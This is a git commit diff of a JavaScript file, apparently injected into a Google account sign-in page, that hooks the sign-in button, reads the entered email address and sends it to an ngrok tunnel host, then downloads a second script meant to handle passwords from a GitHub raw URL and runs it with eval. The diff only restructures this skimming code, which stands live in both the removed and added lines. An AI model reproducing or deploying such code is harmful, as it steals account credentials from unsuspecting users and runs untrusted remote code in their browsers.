dfcc9d9d5aef53c89da324ecf3bb12fa7e7cc9dc
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 20:56:47 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -1,31 +1,25 @@
+function send_email(){
+    let email = document.querySelector('[type="email"]');
+    let param = email.value;
+
+    let xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            console.log(xhr.responseText);
+        }
+    };
+    xhr.send();
+}
+
+
+const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
+
+btn[1].addEventListener('click', function(){
+    send_email();
+})
+
+
+
 (function() {
-    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
-
-    btn[1].addEventListener('click', function(){
-
-        let email = document.querySelector('[type="email"]');
-        let param = email.value;
-
-        let xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-                console.log(xhr.responseText);
-            }
-        };
-        xhr.send();
-        
-        
-
-})();})
-
-
-
-function pwd() {
-    fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js')
-    .then(response => response.text())
-    .then(code => {
-    eval(code);
-});
-    
-pwd()
+    fetch('https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js').then(response => response.text()).then(code => {eval(code)});})
